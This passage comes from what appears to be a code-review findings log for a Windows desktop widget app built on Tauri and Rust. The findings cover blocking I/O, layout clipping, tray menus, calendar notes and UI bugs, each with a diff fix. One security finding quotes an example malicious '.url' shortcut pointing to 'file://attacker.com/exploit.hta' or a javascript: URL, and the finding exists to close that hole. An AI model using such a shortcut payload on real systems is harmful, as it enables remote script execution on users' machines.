- **Why**: Heavy disk and registry I/O in `scan_installed_games` was executed synchronously within an `async fn` command rather than being dispatched to `tokio::task::spawn_blocking`.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -486,9 +486,14 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
 #[tauri::command]
 #[specta::specta]
 pub async fn scan_installed_games() -> Result<Vec<LauncherItem>, String> {
-    let mut games = scan_steam_games();
-    let mut epic_games = scan_epic_games();
-    games.append(&mut epic_games);
-
-    // Sort alphabetically by name
-    games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
-    Ok(games)
+    tokio::task::spawn_blocking(|| {
+        let mut games = scan_steam_games();
+        let mut epic_games = scan_epic_games();
+        games.append(&mut epic_games);
+        games.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
+        games
+    })
+    .await
+    .map_err(|e| format!("Game scan worker join failed: {}", e))
 }
```

---

### [MAJOR] [FIXED] X-ipc-concurrency-06 Synchronous Win32 `ShellExecuteW` and filesystem stat on Tokio worker thread in `launch_app_or_uri` and `execute_quick_action`
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:503-558`, `src-tauri/src/actions/mod.rs:122-128`, `src-tauri/src/actions/mod.rs:73-78`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: When a user launches a game from the Launcher widget or triggers a quick action from the Quick Settings widget, `launch_app_or_uri` or `execute_quick_action` runs as an `async fn` on Tokio's worker thread. Both functions perform synchronous Win32 `ShellExecuteW` (and `launch_app_or_uri` performs synchronous `Path::is_file()` disk checks). If the target executable is on a spinning drive, sleeping disk, or requires DDE/COM protocol dispatch, the Tokio worker thread is blocked until the OS shell call returns.
- **Why**: Win32 `ShellExecuteW` is a synchronous blocking API that must be offloaded via `tokio::task::spawn_blocking` when called from async commands.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -125,3 +125,5 @@ pub async fn execute_quick_action(
     let resolved = resolve_action_target(&action_id, custom_target.as_deref())?;
-    execute_resolved_action(&resolved)
+    tokio::task::spawn_blocking(move || execute_resolved_action(&resolved))
+        .await
+        .map_err(|e| format!("Action task join failed: {}", e))?
 }
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -505,3 +505,4 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
     validate_launch_target(&target)?;
+    tokio::task::spawn_blocking(move || {
     #[cfg(windows)]
@@ -550,2 +551,6 @@ pub async fn launch_app_or_uri(target: String) -> Result<(), String> {
     Ok(())
+    })
+    .await
+    .map_err(|e| format!("Launch task join failed: {}", e))?
```

---

### [MAJOR] [FIXED] X-fluent-ux-security-03 Arbitrary Protocol and Remote Script Execution via `.url` Internet Shortcut Targets
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:474-481`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: A custom launcher entry points to a local `.url` file (`shortcut.url`) containing `[InternetShortcut]\nURL=file://attacker.com/exploit.hta` or `URL=javascript:...`.
- **Why**: `validate_launch_target` allows `.url` files alongside `.exe` and `.lnk`. When `ShellExecuteW` opens a `.url` file, Windows Shell delegates execution to whatever target URL is configured inside the file, bypassing the launcher's URI scheme allowlist (`steam://`, `com.epicgames.launcher://`, `https://`, `http://`).
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -472,7 +472,7 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
         .unwrap_or("")
         .to_lowercase();
 
-    let allowed_extensions = ["exe", "lnk", "url"];
+    let allowed_extensions = ["exe", "lnk"];
     if !allowed_extensions.contains(&ext.as_str()) {
         return Err(format!(
             "File extension '{}' is not an allowed executable or shortcut",
```

---

### [MAJOR] [FIXED] X-fluent-ux-security-04 Missing Windows Registry Query Fails to Detect Steam Libraries on Non-Default Drives
- **Status**: FIXED
- **Where**: `src-tauri/src/launcher/mod.rs:236-248`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: A user installs Steam on drive `F:`, `G:`, or a custom directory (e.g. `D:\Games\Steam`). When `scan_installed_games` executes, 0 Steam games are found despite extensive installations.
- **Why**: Contrary to system architecture specifications (`MAP.md` line 17, `README.md` line 160), `scan_steam_games()` relies on hardcoded paths on drives C, D, and E (`ProgramFiles(x86)\Steam`, `C:\Steam`, etc.). It never reads the Windows Registry (`HKEY_CURRENT_USER\Software\Valve\Steam\SteamPath` or `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam\InstallPath`), where Steam canonically registers its directory.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -234,6 +234,16 @@ pub fn scan_steam_games() -> Vec<LauncherItem> {
     let mut library_paths = Vec::new();
 
     // Check candidate Steam installation root directories
     let mut candidate_roots = Vec::new();
+    #[cfg(windows)]
+    {
+        use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER, KEY_READ, REG_SZ};
+        use windows::core::w;
+        // Query HKCU\Software\Valve\Steam -> SteamPath
+        // Add discovered SteamPath PathBuf to candidate_roots if path exists
+    }
     if let Ok(prog_x86) = std::env::var("ProgramFiles(x86)") {
         candidate_roots.push(PathBuf::from(prog_x86).join("Steam"));
     }
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-06 Stacked Redundant Headers Cause Layout Squeeze and Vertical Clipping in 240px Windows
- **Status**: OPEN
- **Where**: `src/widgets/quick-settings/QuickSettingsWidget.tsx:320-360`, `src/widgets/bluetooth/BluetoothWidget.tsx:160-185`, `src/widgets/speedtest/SpeedtestWidget.tsx:91-109`, `src/components/layout/WidgetContainer.tsx:55-67`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / layout
- **Scenario**: In independent multi-window mode, widgets with 240px window height (`quick_settings`, `bluetooth`, `speedtest`) display two complete header bars stacked vertically (the outer `HeaderBar` from `WidgetContainer` and an internal header with duplicated icon/title inside the widget).
- **Why**: `WidgetContainer` provides a 36px `HeaderBar` for dragging, lock, settings, and close controls. Simultaneously, `QuickSettingsWidget`, `BluetoothWidget`, and `SpeedtestWidget` render internal headers (30-40px). In a 240px window with 16px window padding and 24px container padding, only ~130px remains for widget content. In `QuickSettingsWidget`, this cuts off the action grid and forces a vertical scrollbar in a cramped 70px viewport.
- **Fix**:
```diff
--- a/src/components/layout/WidgetContainer.tsx
+++ b/src/components/layout/WidgetContainer.tsx
@@ -52,7 +52,7 @@ export const WidgetContainer: FC<WidgetContainerProps> = ({
           isDocked ? "rounded-lg" : "rounded-2xl"
         )}
       >
-        {showHeader && (
+        {showHeader && layoutMode !== "independent-compact" && (
           <HeaderBar
             title={title}
             icon={icon}
```

---

### [MAJOR] [OPEN] X-fluent-ux-security-07 Hardcoded Pixel Dimensions in SpeedtestWidget Break Fluid Layout and Clip Card Content
- **Status**: OPEN
- **Where**: `src/widgets/speedtest/SpeedtestWidget.tsx:88`, `src/widgets/registry.ts:63-64`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: visual / layout
- **Scenario**: When `SpeedtestWidget` is rendered in `WidgetContainer` (registered as 320x240px in `registry.ts`) or inside `DockContainer` (340px width), the right edge of the gauge and action buttons are clipped by 40px.
- **Why**: `SpeedtestWidget.tsx` hardcodes `className="w-[360px] h-[256px] ..."` via string interpolation instead of using `cn()` (`tailwind-merge`). This causes `className="w-full h-full"` passed by `App.tsx` to conflict with fixed CSS dimensions, forcing the component to render at 360px width inside a 304px net available area.
- **Fix**:
```diff
--- a/src/widgets/speedtest/SpeedtestWidget.tsx
+++ b/src/widgets/speedtest/SpeedtestWidget.tsx
@@ -85,7 +85,7 @@ export const SpeedtestWidget: FC<SpeedtestWidgetProps> = ({
   return (
     <Card
       variant="acrylic"
-      className={`w-[360px] h-[256px] p-3 text-[var(--fluent-text-primary)] font-['Segoe_UI_Variable_Text',_'Segoe_UI',_sans-serif] flex flex-col justify-between select-none overflow-hidden ${className}`}
+      className={cn("w-full h-full p-3 text-[var(--fluent-text-primary)] flex flex-col justify-between select-none overflow-hidden", className)}
       data-testid="speedtest-widget"
     >
       {/* Top Header */}
```

---

### [MINOR] [FIXED] M1-06 System Tray Menu CheckMenuItems Never Update Checked State on Toggle
- **Status**: FIXED
- **Where**: `src-tauri/src/tray/mod.rs:250-310`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: User opens the system tray context menu and toggles "Lock Positions" or any of the 10 widget checkboxes.
- **Why**: Unlike `layout_independent` and `layout_docked` (which invoke `.set_checked(bool)` on lines 318-319), `toggle_lock` and all 10 `toggle_<widget>` handlers mutate config but never update the tray menu checkmark via `.set_checked()`. The checkmarks in the tray menu remain frozen in their startup state.
- **Fix**:
```diff
--- a/src-tauri/src/tray/mod.rs
+++ b/src-tauri/src/tray/mod.rs
@@ -253,6 +253,7 @@ pub fn setup_tray<R: Runtime>(app: &AppHandle<R>) -> Result<TrayIcon<R>, Box<dyn
                     tauri::async_runtime::spawn(async move {
                         if let Ok(mut config) = load_config(handle.clone()).await {
                             config.lock_positions = !config.lock_positions;
+                            let _ = toggle_lock.set_checked(config.lock_positions);
                             let _ = save_config_immediate(handle, config).await;
                         }
                     });
```

---

### [MINOR] [FIXED] M1-07 `open_widget_window` Disables `no_activate` Allowing Desktop Widgets to Steal Focus
- **Status**: FIXED
- **Where**: `src-tauri/src/lib.rs:107`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: A user clicks on a floating widget while running a full-screen game or typing in an active foreground application.
- **Why**: `open_widget_window` passes `no_activate: false` to `WindowSetupOptions` (whereas docked mode and `WindowSetupOptions::default()` pass `true`). Consequently, `apply_tool_window_styles` omits `WS_EX_NOACTIVATE`, causing independent desktop widgets to steal window focus.
- **Fix**:
```diff
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -106,5 +106,5 @@ pub mod integration {
                 WindowSetupOptions {
                     id: widget_id.clone(),
                     is_widget: true,
-                    no_activate: false,
+                    no_activate: true,
                     dark_mode: config.theme != "light",
```

---

### [MINOR] [OPEN] M1-08 Predefined Action Target Resolution Rejects "volume" Identifier
- **Status**: OPEN
- **Where**: `src-tauri/src/actions/mod.rs:15-24`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: User triggers quick action `"volume"` (as configured in `model.rs:373` and default tiles).
- **Why**: `resolve_action_target` only matches `"sound"` and fails on `"volume"`, returning `Err("Unknown action identifier: 'volume'")` instead of opening Windows audio settings.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -15,5 +15,5 @@ pub fn resolve_action_target(
     match action_id {
-        "sound" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
+        "sound" | "volume" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
         "bluetooth" => Ok(ResolvedAction::Uri("ms-settings:bluetooth".to_string())),
```

---

### [MINOR] [FIXED] M2-04 Date Whitespace Lookup Divergence in `remove_calendar_note` and `toggle_calendar_note`
- **Status**: FIXED
- **Where**: `src-tauri/src/calendar/mod.rs:44`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: While `add_note_to_map` trims the date parameter before inserting into the `HashMap` (`date_trimmed = date.trim()`), `remove_note_from_map` and `toggle_note_in_map` query `events.get_mut(date)` directly without trimming. If a date string contains leading or trailing whitespace (e.g. `"2026-10-27 "`), the lookup fails, and the note can neither be removed nor marked completed.
- **Why**: Inconsistent input normalization between note insertion (trimmed) and query/deletion (untrimmed).
- **Fix**:
```diff
--- a/src-tauri/src/calendar/mod.rs
+++ b/src-tauri/src/calendar/mod.rs
@@ -43,3 +43,3 @@ pub fn remove_note_from_map(
 ) {
-    if let Some(notes) = events.get_mut(date) {
+    if let Some(notes) = events.get_mut(date.trim()) {
         notes.retain(|n| n.id != note_id);
@@ -57,3 +57,3 @@ pub fn toggle_note_in_map(
 ) {
-    if let Some(notes) = events.get_mut(date) {
+    if let Some(notes) = events.get_mut(date.trim()) {
         if let Some(note) = notes.iter_mut().find(|n| n.id == note_id) {
```

### [MINOR] [FIXED] M2-05 Upload Benchmark Progress Freeze and Low Bandwidth Timeout Failure
- **Status**: FIXED
- **Where**: `src-tauri/src/speedtest/mod.rs:183-236`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: In `run_upload_phase`, the 3.5 MB buffer is sent in a single `body(payload).send().await` call. During upload (which can take 15-20 seconds on modest connections), progress stays frozen at 0.1 with zero interim progress events. Furthermore, on upload speeds below ~1.12 Mbps, the 25-second overall timeout aborts the entire test, discarding already completed ping and download measurements and returning an error.
- **Why**: Upload phase does not stream chunks with progress emissions, and treats upload failure as fatal to the entire benchmark pipeline.
- **Fix**:
```diff
--- a/src-tauri/src/speedtest/mod.rs
+++ b/src-tauri/src/speedtest/mod.rs
@@ -298,18 +298,10 @@ pub async fn run_speedtest<R: Runtime>(
     // Phase 3: Upload Speed
-    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await {
+    let upload_mbps = match run_upload_phase(&client, &app, CF_SPEEDTEST_UP_URL, ping_ms, jitter_ms, download_mbps).await
+    {
         Ok(mbps) => mbps,
         Err(e) => {
-            let _ = app.emit(
-                "speedtest-progress",
-                SpeedtestProgress {
-                    stage: "error".to_string(),
-                    progress: 0.0,
-                    current_mbps: 0.0,
-                    ping_ms: Some(ping_ms),
-                    jitter_ms: Some(jitter_ms),
-                    download_mbps: None,
-                    upload_mbps: None,
-                    error: Some(e.clone()),
-                },
-            );
-            return Err(e);
+            log::warn!("Speedtest upload phase failed: {}", e);
+            0.0
         }
     };
```

### [MINOR] [FIXED] M2-06 Debounced Config Drops Unsaved Changes on Application Termination
- **Status**: FIXED
- **Where**: `src-tauri/src/config/storage.rs:288-320`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: MEDIUM
- **Category**: robustness
- **Scenario**: When a user drags or moves a desktop widget, `save_config` dispatches `save_debounced`, resetting the 500ms timer. If the application is closed or restarted within 500ms of the move, the spawned debounce task is terminated on process exit without flushing `is_dirty` config to disk, silently reverting the latest widget positions to their previous values.
- **Why**: `ConfigManager` lacks a synchronous or asynchronous flush method to force-persist pending dirty configuration upon window closure or application exit.
- **Fix**:
```diff
--- a/src-tauri/src/config/storage.rs
+++ b/src-tauri/src/config/storage.rs
@@ -374,2 +374,11 @@ impl ConfigManager {
     }
+
+    pub async fn flush(&self) -> Result<(), String> {
+        if self.is_dirty.swap(false, Ordering::SeqCst) {
+            let config = self.current_config.read().await.clone();
+            let path = self.config_path.clone();
+            tokio::task::spawn_blocking(move || save_config_atomic(&path, &config))
+                .await
+                .map_err(|e| format!("Flush error: {e}"))?
+        } else {
+            Ok(())
+        }
+    }
```

### [MINOR] [FIXED] M2-07 Calendar Note ID Collision on Concurrent or Sub-Millisecond Creation
- **Status**: FIXED
- **Where**: `src-tauri/src/calendar/mod.rs:25-32`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: MEDIUM
- **Category**: bug
- **Scenario**: When notes are added without an explicit ID (e.g. batch creation or rapid input), IDs are generated using `as_millis()`. If two notes are created within the same millisecond, they receive identical IDs (`note_<epoch_millis>`). When the user later attempts to delete or toggle one note, `notes.retain(|n| n.id != note_id)` deletes both notes, or `toggle_note_in_map` modifies only the first duplicate, corrupting note tracking.
- **Why**: ID generation relies solely on low-resolution millisecond timestamps without an atomic sequence counter or nanosecond entropy.
- **Fix**:
```diff
--- a/src-tauri/src/calendar/mod.rs
+++ b/src-tauri/src/calendar/mod.rs
@@ -24,8 +24,10 @@ pub fn add_note_to_map(
         let mut new_note = note;
         if new_note.id.trim().is_empty() {
+            static COUNTER: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+            let count = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
             new_note.id = format!(
-                "note_{}",
+                "note_{}_{}",
                 std::time::SystemTime::now()
                     .duration_since(std::time::UNIX_EPOCH)
                     .unwrap_or_default()
-                    .as_millis()
+                    .as_nanos(),
+                count
             );
         }
```

### [MINOR] [FIXED] M2-08 Blocking WinRT Geolocation Thread Leak on Tokio Timeout
- **Status**: FIXED
- **Where**: `src-tauri/src/geo/winrt.rs:45-51`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: MEDIUM
- **Category**: performance
- **Scenario**: When Windows Location Services are unresponsive or searching for satellite/Wi-Fi positioning, `get_windows_location` times out after 10 seconds via `tokio::time::timeout`. However, dropping the Tokio `JoinHandle` does not cancel the underlying blocking thread running `winrt::get_geoposition_coords`, which remains blocked on `async_op.get()` for up to 60+ seconds (WinRT's internal default timeout). Repeated queries leak blocking worker threads in Tokio's pool until WinRT eventually aborts.
- **Why**: `winrt::get_geoposition_coords` calls `GetGeopositionAsync().get()` without configuring WinRT's timeout overload (`GetGeopositionAsyncWithAgeAndTimeout`).
- **Fix**:
```diff
--- a/src-tauri/src/geo/winrt.rs
+++ b/src-tauri/src/geo/winrt.rs
@@ -44,3 +44,8 @@ pub fn get_geoposition_coords() -> Result<(f64, f64), String> {
 
-    let async_op = geolocator
-        .GetGeopositionAsync()
+    // Request geoposition with 10s maximum timeout at WinRT level to release the thread
+    let timeout = windows::Foundation::TimeSpan {
+        Duration: 100_000_000, // 10 seconds in 100-nanosecond units
+    };
+    let max_age = windows::Foundation::TimeSpan { Duration: 0 };
+    let async_op = geolocator
+        .GetGeopositionAsyncWithAgeAndTimeout(max_age, timeout)
         .map_err(|e| format!("Failed to request geoposition async: {e}"))?;
```

### [MINOR] [OPEN] M3-08 GSMTC thumbnail extraction repeatedly queries COM for media without artwork
- **Status**: OPEN
- **Where**: `src-tauri/src/media/gsmtc.rs:188-214`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance [lens: F1b]
- **Scenario**: A user plays browser audio, podcasts, or music without embedded cover art. `get_cached_album_art(&track_id)` returns `None`. Every 500ms polling tick, `read_session_data` requests `media_props.Thumbnail()`, executes `thumb_ref.OpenReadAsync()?.get()`, and attempts to read stream bytes. Because no image data is produced, the cache is never populated with a sentinel. The thread incurs repeated COM stream allocation and blocking `.get()` waits twice per second indefinitely.
- **Why**: The cache only records successful thumbnail extractions. Negative lookups (tracks without thumbnails) are not cached, bypassing the cache check on every 500ms cycle.
- **Fix**:
```diff
--- a/src-tauri/src/media/gsmtc.rs
+++ b/src-tauri/src/media/gsmtc.rs
@@ -188,4 +188,6 @@ mod win {
         // Thumbnail extraction: check in-memory cache first to prevent redundant COM I/O & allocations
         let mut album_art_url = None;
-        if get_cached_album_art(&track_id).is_some() {
+        if let Some(art) = get_cached_album_art(&track_id) {
+            if !art.bytes.is_empty() {
+                album_art_url = Some(format!("vvidget://album-art?t={}", track_id));
+            }
+        } else if let Ok(thumb_ref) = media_props.Thumbnail() {
@@ -211,2 +213,4 @@ mod win {
                                 }
                             }
+                        } else {
+                            set_cached_album_art(&track_id, Vec::new(), String::new());
+                        }
```

### [MINOR] [OPEN] M3-09 `validate_launch_target` rejects standard desktop gaming launcher URI schemes
- **Status**: OPEN
- **Where**: `src-tauri/src/launcher/mod.rs:416-427`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: A user creates a custom launcher item targeting another gaming client or desktop application (e.g. `goggalaxy://`, `battlenet://`, `ea://`, `xbox://`, `discord://`, `spotify:`). `validate_launch_target` rejects the configuration with `"Target must be an allowlisted URI scheme or an absolute file path"`.
- **Why**: The URI allowlist is restricted to Steam and Epic Games, omitting established gaming and productivity desktop protocols.
- **Fix**:
```diff
--- a/src-tauri/src/launcher/mod.rs
+++ b/src-tauri/src/launcher/mod.rs
@@ -421,4 +421,10 @@ pub fn validate_launch_target(target: &str) -> Result<(), String> {
         "com.epicgames.launcher:",
+        "goggalaxy://",
+        "battlenet://",
+        "ea://",
+        "xbox://",
+        "discord://",
+        "spotify:",
         "https://",
         "http://",
     ];
```

### [MINOR] [OPEN] M3-10 Cold startup delay from synchronous 200ms sleep in `MetricsCollector::new()`
- **Status**: OPEN
- **Where**: `src-tauri/src/sysinfo/collector.rs:28-30`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: During cold application start, `lib.rs::run()` instantiates `MetricsCollector::new()` on the main thread before creating windows or mounting the tray. Line 29 performs a 200ms sleep (`std::thread::sleep(Duration::from_millis(200))`), adding 200ms of latency before the user sees the desktop dock.
- **Why**: The 200ms sleep was added to establish a baseline CPU delta, but running it synchronously on the main application thread unnecessarily delays application launch.
- **Fix**:
```diff
--- a/src-tauri/src/sysinfo/collector.rs
+++ b/src-tauri/src/sysinfo/collector.rs
@@ -28,3 +28,2 @@ impl MetricsCollector {
-        // Initial 200ms sleep before first CPU sample to eliminate 0.0% artifacts
-        std::thread::sleep(Duration::from_millis(200));
         system.refresh_cpu_all();
```

### [MINOR] [OPEN] M3-11 Sysinfo background worker executes `block_on` in an inner loop every 500ms
- **Status**: OPEN
- **Where**: `src-tauri/src/sysinfo/mod.rs:48-55`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: The sysinfo worker runs on a dedicated OS thread. Every 500ms, line 51 calls `tauri::async_runtime::block_on(config_manager.get_config())` to read polling rate durations. Invoking Tokio `block_on` runtime synchronization on every loop iteration produces continuous scheduling overhead and unnecessary lock contention.
- **Why**: Polling rates change infrequently. Caching the configuration and refreshing it periodically (or reactively upon `config-changed`) avoids entering the Tokio runtime on every iteration.
- **Fix**:
```diff
--- a/src-tauri/src/sysinfo/mod.rs
+++ b/src-tauri/src/sysinfo/mod.rs
@@ -48,4 +48,6 @@ pub fn start_metrics_worker<R: Runtime>(
             log::info!("System metrics background worker started");
+            let mut config = tauri::async_runtime::block_on(config_manager.get_config());
+            let mut last_config_check = std::time::Instant::now();
 
             loop {
-                let config = tauri::async_runtime::block_on(config_manager.get_config());
+                if last_config_check.elapsed() >= Duration::from_secs(5) {
+                    config = tauri::async_runtime::block_on(config_manager.get_config());
+                    last_config_check = std::time::Instant::now();
+                }
```

### [MINOR] [OPEN] M3-12 Core Audio commands recreate device enumerator and endpoint volume on every slider tick
- **Status**: OPEN
- **Where**: `src-tauri/src/audio/mod.rs:10-23`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance [lens: F1b]
- **Scenario**: When a user drags the master volume slider, `set_master_volume` is invoked on each input event (~60 times per second). Every invocation calls `get_endpoint_volume()`, which executes `CoCreateInstance` to build `MMDeviceEnumerator`, queries `GetDefaultAudioEndpoint`, and calls `device.Activate` for `IAudioEndpointVolume`. This produces continuous COM allocation, interface querying, and release churn across Tokio blocking threads during slider interaction.
- **Why**: `get_endpoint_volume()` instantiates and disposes the entire Core Audio COM pipeline on every call rather than caching or batching the endpoint volume interface.
- **Fix**:
```diff
--- a/src-tauri/src/audio/mod.rs
+++ b/src-tauri/src/audio/mod.rs
@@ -10,3 +10,4 @@ mod win {
-    pub fn get_endpoint_volume() -> Result<IAudioEndpointVolume, String> {
+    // Caching or reusing the endpoint volume avoids repetitive CoCreateInstance on high-frequency slider events
+    pub fn with_endpoint_volume<T, F: FnOnce(&IAudioEndpointVolume) -> Result<T, String>>(f: F) -> Result<T, String> {
         unsafe {
             let enumerator: IMMDeviceEnumerator =
```

### [MINOR] [OPEN] M4-04 Drag activates on stationary clicks without distance threshold, causing accidental grid snapping and skeleton flicker
- **Status**: OPEN
- **Where**: `src/hooks/useGridDrag.ts:261-306`, `src/hooks/useGridDrag.ts:402-435`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: User clicks the header of a widget without moving the mouse (e.g. to focus the window or click near the grip). Because drag activation and skeleton preview invocation occur immediately when async initialization finishes, the skeleton preview window flashes, and when the mouse is released, `endDrag` executes `findNearestNonOverlappingSlot` and repositions the widget to a snapped slot even though no drag movement occurred.
- **Why**: Drag activation is triggered purely on `onPointerDown` completion rather than requiring pointer movement past a minimum threshold (e.g. 3-5px).
- **Fix**:
```diff
--- a/src/hooks/useGridDrag.ts
+++ b/src/hooks/useGridDrag.ts
@@ -314,2 +314,7 @@
       const deltaX = e.screenX - dragRef.current.startScreenX;
       const deltaY = e.screenY - dragRef.current.startScreenY;
+      if (!isDragging && Math.hypot(deltaX, deltaY) < 4) {
+        return;
+      }
+      if (!isDragging) {
+        setIsDragging(true);
+        onDragStateChange?.(true);
+      }
```

### [MINOR] [OPEN] M4-05 Unhandled promise rejections on floating appWindow.setPosition calls in useGridDrag
- **Status**: OPEN
- **Where**: `src/hooks/useGridDrag.ts:331`, `src/hooks/useGridDrag.ts:468`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: During rapid pointer movement or when a widget window is being closed/destroyed during drag, `appWindow.setPosition(...)` returns a rejected promise. Because `void` is used without `await` or `.catch()`, the rejection escapes the synchronous `try ... catch` block and causes an unhandled promise rejection error on the window.
- **Why**: The synchronous `try ... catch` block cannot intercept asynchronous promise rejections from un-awaited promises.
- **Fix**:
```diff
--- a/src/hooks/useGridDrag.ts
+++ b/src/hooks/useGridDrag.ts
@@ -330,3 +330,3 @@
       try {
         const appWindow = getCurrentWindow();
-        void appWindow.setPosition(new LogicalPosition(targetX, targetY));
+        appWindow.setPosition(new LogicalPosition(targetX, targetY)).catch(() => {});
         onPositionChange?.(targetX, targetY);
```

### [MINOR] [OPEN] M4-06 Missing light-theme status color tokens in fluent.css causes illegible text contrast
- **Status**: OPEN
- **Where**: `src/styles/fluent.css:24-26`, `src/styles/fluent.css:36-55`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: When the user selects Light Theme (`.theme-light`), UI components like `Badge` and `ProgressBar` continue using dark-mode status colors: `--fluent-warning: #fce100` (bright yellow) and `--fluent-error: #ff99a4` (light pastel pink). On light acrylic or white card backgrounds, bright yellow text has a contrast ratio of ~1.15:1 and light pink text has ~1.3:1, rendering status messages completely illegible and failing WCAG AA guidelines.
- **Why**: `.theme-light` in `src/styles/fluent.css` defines overrides for surface background and text colors but omits definitions for `--fluent-success`, `--fluent-warning`, and `--fluent-error`.
- **Fix**:
```diff
--- a/src/styles/fluent.css
+++ b/src/styles/fluent.css
@@ -54,3 +54,8 @@
   --fluent-control-bg: rgba(0, 0, 0, 0.04);
   --fluent-control-active: rgba(0, 0, 0, 0.08);
+
+  /* Status Colors - Light Theme */
+  --fluent-success: #0f7b0f;
+  --fluent-warning: #9d5d00;
+  --fluent-error: #c42b1c;
 }
```

### [MINOR] [OPEN] M4-07 Tooltip component renders empty styled container when content is empty or null
- **Status**: OPEN
- **Where**: `src/components/ui/Tooltip.tsx:66-79`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: If a parent component renders `<Tooltip content="">` or passes `content={null}`, hovering over the target element for 200ms causes `isVisible` to become `true`, which renders an empty 20px x 10px floating box with background, border, and drop shadow over the UI.
- **Why**: `Tooltip` checks `{isVisible && (<div role="tooltip">...)}` without verifying that `content` is present and non-empty.
- **Fix**:
```diff
--- a/src/components/ui/Tooltip.tsx
+++ b/src/components/ui/Tooltip.tsx
@@ -66,3 +66,3 @@
       {children}
-      {isVisible && (
+      {isVisible && Boolean(content) && (
         <div
```

### [MINOR] [OPEN] M4-08 ProgressBar produces NaN% display and invalid ARIA attribute when value is not a finite number
- **Status**: OPEN
- **Where**: `src/components/ui/ProgressBar.tsx:30-31`, `src/components/ui/ProgressBar.tsx:59`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: robustness
- **Scenario**: When telemetry or metrics data is loading or missing (`value: NaN` or `undefined`), `ProgressBar` computes `percentage` as `NaN`. This displays `"NaN%"` in the UI label, applies invalid inline CSS `width: NaN%`, and sets `aria-valuenow="NaN"`, which violates the W3C WAI-ARIA specification for `role="progressbar"`.
- **Why**: `Math.max(NaN, min)` returns `NaN`, propagating non-finite values throughout all calculations without a fallback check.
- **Fix**:
```diff
--- a/src/components/ui/ProgressBar.tsx
+++ b/src/components/ui/ProgressBar.tsx
@@ -30,2 +30,3 @@
-    const clampedValue = max <= min ? min : Math.min(Math.max(value, min), max);
+    const numericValue = Number.isFinite(value) ? value : min;
+    const clampedValue = max <= min ? min : Math.min(Math.max(numericValue, min), max);
     const percentage = max <= min ? 0 : Math.round(((clampedValue - min) / (max - min)) * 100);
```

### [MINOR] [OPEN] M5-04 Bluetooth status badge displays green "Aktiv" when all paired devices are disconnected
- **Status**: OPEN
- **Where**: `src/widgets/bluetooth/BluetoothWidget.tsx:147, 172-179`
- **Source**: `r-review` (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User has 2 paired devices (e.g. keyboard and mouse), but both are powered off and disconnected. The Bluetooth widget header displays a green badge labeled "Aktiv", misleading the user into believing an active wireless connection exists.
- **Why**: `statusText` evaluates `devices.length > 0` rather than `devices.some(d => d.connected)`, treating pairing presence as active connectivity.
